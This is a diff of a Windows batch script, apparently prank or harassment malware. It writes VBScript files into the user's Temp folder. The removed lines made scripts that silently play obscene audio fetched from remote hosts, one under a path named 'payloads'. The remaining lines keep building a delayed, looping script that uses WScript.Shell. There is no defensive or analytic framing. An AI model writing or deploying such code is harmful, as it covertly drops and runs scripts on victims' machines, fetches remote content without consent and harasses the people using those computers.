@@ -75,35 +75,6 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 @echo     objFile.Close( )>>%lol%.vbs
 @echo End Sub>>%lol%.vbs
 
-set file=Defis_et_Lilopie_Pur_Biday.mp3
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "https://files.catbox.moe/96b8bl.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%nouveau%.vbs
-
-set file=alerte_enculay.mp3
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/alerte_enculay.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%salope%.vbs
-
-set file=alerte_enculay.mp3
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo wscript.sleep 260000
-  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/alerte_shemale.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%japonais%.vbs
-
-
 @echo WScript.Sleep 84000>>%twitch%.vbs
 @echo do>>%twitch%.vbs
 @echo Dim wsh>>%twitch%.vbs
